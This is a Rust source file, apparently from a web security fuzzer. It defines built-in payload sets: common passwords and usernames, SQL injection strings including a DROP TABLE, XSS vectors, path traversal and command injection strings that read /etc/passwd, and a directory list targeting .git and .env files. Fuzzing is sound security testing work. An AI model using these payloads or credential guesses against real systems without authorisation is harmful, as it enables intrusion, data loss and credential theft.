//! Payload generation and management for fuzzing

use std::fs::File;
use std::io::{BufRead, BufReader};
use std::path::Path;
use anyhow::{Context, Result};

/// Position in a request where payload will be injected
#[derive(Debug, Clone)]
pub struct PayloadPosition {
    /// Position identifier (e.g., "param1", "header_auth")
    pub name: String,
    /// Start index in the template
    pub start: usize,
    /// End index in the template
    pub end: usize,
    /// Original value at this position
    pub original_value: String,
}

/// A set of payloads for fuzzing
#[derive(Debug, Clone)]
pub struct PayloadSet {
    /// Name of the payload set
    pub name: String,
    /// List of payloads
    pub payloads: Vec<String>,
    /// Current index for iteration
    current_index: usize,
}

impl PayloadSet {
    /// Create a new payload set from a list
    pub fn new(name: &str, payloads: Vec<String>) -> Self {
        Self {
            name: name.to_string(),
            payloads,
            current_index: 0,
        }
    }

    /// Load payloads from a wordlist file
    pub fn from_file(name: &str, path: &Path) -> Result<Self> {
        let file = File::open(path)
            .with_context(|| format!("Failed to open wordlist: {}", path.display()))?;
        let reader = BufReader::new(file);

        let payloads: Vec<String> = reader
            .lines()
            .filter_map(|line| line.ok())
            .filter(|line| !line.is_empty() && !line.starts_with('#'))
            .collect();

        Ok(Self::new(name, payloads))
    }

    /// Create common payload sets
    pub fn common_passwords() -> Self {
        Self::new("common_passwords", vec![
            "password".to_string(),
            "123456".to_string(),
            "12345678".to_string(),
            "qwerty".to_string(),
            "abc123".to_string(),
            "monkey".to_string(),
            "1234567".to_string(),
            "letmein".to_string(),
            "trustno1".to_string(),
            "dragon".to_string(),
            "baseball".to_string(),
            "iloveyou".to_string(),
            "master".to_string(),
            "sunshine".to_string(),
            "ashley".to_string(),
            "bailey".to_string(),
            "shadow".to_string(),
            "123123".to_string(),
            "654321".to_string(),
            "superman".to_string(),
            "qazwsx".to_string(),
            "michael".to_string(),
            "football".to_string(),
            "password1".to_string(),
            "password123".to_string(),
            "admin".to_string(),
            "admin123".to_string(),
            "root".to_string(),
            "toor".to_string(),
            "pass".to_string(),
        ])
    }

    pub fn common_usernames() -> Self {
        Self::new("common_usernames", vec![
            "admin".to_string(),
            "administrator".to_string(),
            "root".to_string(),
            "user".to_string(),
            "test".to_string(),
            "guest".to_string(),
            "info".to_string(),
            "adm".to_string(),
            "mysql".to_string(),
            "postgres".to_string(),
            "oracle".to_string(),
            "ftp".to_string(),
            "anonymous".to_string(),
            "pi".to_string(),
            "puppet".to_string(),
            "ansible".to_string(),
            "ec2-user".to_string(),
            "vagrant".to_string(),
            "azureuser".to_string(),
            "deploy".to_string(),
        ])
    }

    pub fn sqli_payloads() -> Self {
        Self::new("sqli", vec![
            "' OR '1'='1".to_string(),
            "' OR '1'='1' --".to_string(),
            "' OR '1'='1' /*".to_string(),
            "' OR 1=1--".to_string(),
            "' OR 1=1#".to_string(),
            "admin'--".to_string(),
            "admin' #".to_string(),
            "admin'/*".to_string(),
            "' UNION SELECT NULL--".to_string(),
            "' UNION SELECT NULL, NULL--".to_string(),
            "1' ORDER BY 1--".to_string(),
            "1' ORDER BY 10--".to_string(),
            "1 AND 1=1".to_string(),
            "1 AND 1=2".to_string(),
            "1' AND '1'='1".to_string(),
            "1' AND '1'='2".to_string(),
            "1; DROP TABLE users--".to_string(),
            "1'; WAITFOR DELAY '0:0:5'--".to_string(),
            "1'; SELECT SLEEP(5)--".to_string(),
            "' AND SLEEP(5)--".to_string(),
        ])
    }

    pub fn xss_payloads() -> Self {
        Self::new("xss", vec![
            "<script>alert(1)</script>".to_string(),
            "<img src=x onerror=alert(1)>".to_string(),
            "<svg onload=alert(1)>".to_string(),
            "<body onload=alert(1)>".to_string(),
            "javascript:alert(1)".to_string(),
            "\"><script>alert(1)</script>".to_string(),
            "'><script>alert(1)</script>".to_string(),
            "<img src=\"x\" onerror=\"alert(1)\">".to_string(),
            "<svg/onload=alert(1)>".to_string(),
            "<iframe src=\"javascript:alert(1)\">".to_string(),
            "<input onfocus=alert(1) autofocus>".to_string(),
            "<marquee onstart=alert(1)>".to_string(),
            "<details open ontoggle=alert(1)>".to_string(),
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>".to_string(),
            "'-alert(1)-'".to_string(),
            "\"-alert(1)-\"".to_string(),
        ])
    }

    pub fn path_traversal_payloads() -> Self {
        Self::new("path_traversal", vec![
            "../../../etc/passwd".to_string(),
            "..\\..\\..\\windows\\win.ini".to_string(),
            "....//....//....//etc/passwd".to_string(),
            "..%2f..%2f..%2fetc/passwd".to_string(),
            "..%252f..%252f..%252fetc/passwd".to_string(),
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd".to_string(),
            "/etc/passwd".to_string(),
            "file:///etc/passwd".to_string(),
            "/..\\..\\..\\..\\etc/passwd".to_string(),
            "..././..././..././etc/passwd".to_string(),
        ])
    }

    pub fn command_injection_payloads() -> Self {
        Self::new("command_injection", vec![
            "; id".to_string(),
            "| id".to_string(),
            "|| id".to_string(),
            "& id".to_string(),
            "&& id".to_string(),
            "`id`".to_string(),
            "$(id)".to_string(),
            "; whoami".to_string(),
            "| whoami".to_string(),
            "; cat /etc/passwd".to_string(),
            "| cat /etc/passwd".to_string(),
            "; sleep 5".to_string(),
            "| sleep 5".to_string(),
            "& ping -c 5 127.0.0.1 &".to_string(),
            "| ping -n 5 127.0.0.1".to_string(),
        ])
    }

    pub fn directory_bruteforce() -> Self {
        Self::new("directories", vec![
            "admin".to_string(),
            "administrator".to_string(),
            "login".to_string(),
            "wp-admin".to_string(),
            "wp-login.php".to_string(),
            "phpmyadmin".to_string(),
            "cpanel".to_string(),
            "webmail".to_string(),
            "api".to_string(),
            "api/v1".to_string(),
            "api/v2".to_string(),
            "graphql".to_string(),
            "swagger".to_string(),
            "swagger-ui".to_string(),
            "docs".to_string(),
            "documentation".to_string(),
            ".git".to_string(),
            ".git/config".to_string(),
            ".env".to_string(),
            ".htaccess".to_string(),
            "robots.txt".to_string(),
            "sitemap.xml".to_string(),
            "backup".to_string(),
            "backups".to_string(),
            "config".to_string(),
            "configuration".to_string(),
            "debug".to_string(),
            "test".to_string(),
            "temp".to_string(),
            "tmp".to_string(),
            "upload".to_string(),
            "uploads".to_string(),
            "files".to_string(),
            "static".to_string(),
            "assets".to_string(),
            "img".to_string(),
            "images".to_string(),
            "css".to_string(),
            "js".to_string(),
            "scripts".to_string(),
            "server-status".to_string(),
            "server-info".to_string(),
            "health".to_string(),
            "healthcheck".to_string(),
            "status".to_string(),
            "metrics".to_string(),
            "prometheus".to_string(),
            "actuator".to_string(),
            "actuator/health".to_string(),
            "console".to_string(),
            "shell".to_string(),
        ])
    }

    pub fn numbers(start: i64, end: i64) -> Self {
        let payloads: Vec<String> = (start..=end).map(|n| n.to_string()).collect();
        Self::new("numbers", payloads)
    }

    pub fn len(&self) -> usize {
        self.payloads.len()
    }

    pub fn is_empty(&self) -> bool {
        self.payloads.is_empty()
    }

    pub fn reset(&mut self) {
        self.current_index = 0;
    }
}

impl Iterator for PayloadSet {
    type Item = String;

    fn next(&mut self) -> Option<Self::Item> {
        if self.current_index < self.payloads.len() {
            let payload = self.payloads[self.current_index].clone();
            self.current_index += 1;
            Some(payload)
        } else {
            None
        }
    }
}

/// Payload generator for different fuzzing strategies
pub struct PayloadGenerator {
    /// Payload sets for each position
    pub sets: Vec<PayloadSet>,
}

impl PayloadGenerator {
    pub fn new(sets: Vec<PayloadSet>) -> Self {
        Self { sets }
    }

    /// Calculate total combinations based on attack mode
    pub fn total_combinations(&self, mode: &super::AttackMode) -> usize {
        if self.sets.is_empty() {
            return 0;
        }

        match mode {
            super::AttackMode::Sniper => {
                // Each payload in each position
                self.sets.iter().map(|s| s.len()).sum()
            }
            super::AttackMode::Battering => {
                // Same payload to all positions, max payload count
                self.sets.iter().map(|s| s.len()).max().unwrap_or(0)
            }
            super::AttackMode::Pitchfork => {
                // Parallel iteration, limited by shortest set
                self.sets.iter().map(|s| s.len()).min().unwrap_or(0)
            }
            super::AttackMode::ClusterBomb => {
                // Cartesian product
                self.sets.iter().map(|s| s.len()).product()
            }
        }
    }
}
